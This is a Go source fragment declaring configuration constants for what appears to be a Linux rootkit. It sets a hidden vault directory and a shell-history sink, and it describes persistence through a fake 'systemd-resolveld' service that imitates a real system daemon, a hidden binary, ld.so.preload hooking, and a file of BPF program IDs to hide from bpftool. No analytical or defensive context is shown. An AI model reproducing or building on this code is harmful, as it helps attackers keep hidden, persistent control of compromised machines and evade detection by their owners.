package main

const (
	port        = 2333
	hiddenDir   = "/tmp/.rkit_vault"
	historySink = "/tmp/.del" 

	// LinkPro-style persistence
	persistDir      = "/usr/lib/.system"
	persistBinary   = "/usr/lib/.system/.tmp~data.resolveld"
	persistUnit     = "systemd-resolveld.service"
	persistUnitPath = "/etc/systemd/system/systemd-resolveld.service"
	ldPreloadBak    = "/etc/ld.so.preload.rkit.bak"
	libldPath       = "/etc/libld.so"
	bpffsFire       = "/sys/fs/bpf/fire"
	bpfHideIdsFile  = "/tmp/.rkit_vault/.bpfinfo" // IDs to hide from bpftool (prog/map/link), read by preload
)
